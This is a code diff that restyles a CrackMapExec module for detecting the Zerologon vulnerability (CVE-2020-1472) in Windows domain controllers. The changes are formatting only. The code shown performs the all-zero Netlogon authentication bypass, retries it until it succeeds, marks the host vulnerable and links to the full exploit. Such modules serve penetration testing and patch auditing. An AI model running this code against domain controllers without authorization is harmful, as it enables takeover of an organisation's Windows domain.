@@ -28,21 +28,29 @@ class CMEModule:
 
     def on_login(self, context, connection):
         self.context = context
-        if self.perform_attack('\\\\' + connection.hostname, connection.host, connection.hostname):
+        if self.perform_attack("\\\\" + connection.hostname, connection.host, connection.hostname):
             self.context.log.highlight("VULNERABLE")
             self.context.log.highlight("Next step: https://github.com/dirkjanm/CVE-2020-1472")
             try:
                 host = self.context.db.get_hosts(connection.host)[0]
-                self.context.db.add_host(host.ip, host.hostname, host.domain, host.os, host.smbv1, host.signing, zerologon=True)
+                self.context.db.add_host(
+                    host.ip,
+                    host.hostname,
+                    host.domain,
+                    host.os,
+                    host.smbv1,
+                    host.signing,
+                    zerologon=True,
+                )
             except Exception as e:
                 self.context.log.debug(f"Error updating zerologon status in database")
 
     def perform_attack(self, dc_handle, dc_ip, target_computer):
         # Keep authenticating until successful. Expected average number of attempts needed: 256.
-        self.context.log.debug('Performing authentication attempts...')
+        self.context.log.debug("Performing authentication attempts...")
         rpc_con = None
         try:
-            binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
+            binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp")
             rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
             rpc_con.connect()
             rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
@@ -51,15 +59,17 @@ class CMEModule:
                 if result:
                     return True
             else:
-                self.context.log.debug('\nAttack failed. Target is probably patched.')
+                self.context.log.debug("\nAttack failed. Target is probably patched.")
         except DCERPCException as e:
-            self.context.log.fail(f"Error while connecting to host: DCERPCException, "
-                                   f"which means this is probably not a DC!")
+            self.context.log.fail(f"Error while connecting to host: DCERPCException, " f"which means this is probably not a DC!")
 
 
 def fail(msg):
     cme_logger.debug(msg, file=sys.stderr)
-    cme_logger.debug('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
+    cme_logger.debug(
+        "This might have been caused by invalid arguments or network issues.",
+        file=sys.stderr,
+    )
     sys.exit(2)
 
 
@@ -67,34 +77,34 @@ def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):
     # Connect to the DC's Netlogon service.
 
     # Use an all-zero challenge and credential.
-    plaintext = b'\x00' * 8
-    ciphertext = b'\x00' * 8
+    plaintext = b"\x00" * 8
+    ciphertext = b"\x00" * 8
 
     # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
-    flags = 0x212fffff
+    flags = 0x212FFFFF
 
     # Send challenge and authentication request.
-    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
+    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + "\x00", target_computer + "\x00", plaintext)
     try:
         server_auth = nrpc.hNetrServerAuthenticate3(
             rpc_con,
-            dc_handle + '\x00',
-            target_computer + '$\x00',
+            dc_handle + "\x00",
+            target_computer + "$\x00",
             nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
-            target_computer + '\x00',
+            target_computer + "\x00",
             ciphertext,
-            flags
+            flags,
         )
 
         # It worked!
-        assert server_auth['ErrorCode'] == 0
+        assert server_auth["ErrorCode"] == 0
         return True
 
     except nrpc.DCERPCSessionError as ex:
         # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
-        if ex.get_error_code() == 0xc0000022:
+        if ex.get_error_code() == 0xC0000022:
             return None
         else:
-            fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
+            fail(f"Unexpected error code from DC: {ex.get_error_code()}.")
     except BaseException as ex:
-        fail(f'Unexpected error: {ex}.')
+        fail(f"Unexpected error: {ex}.")
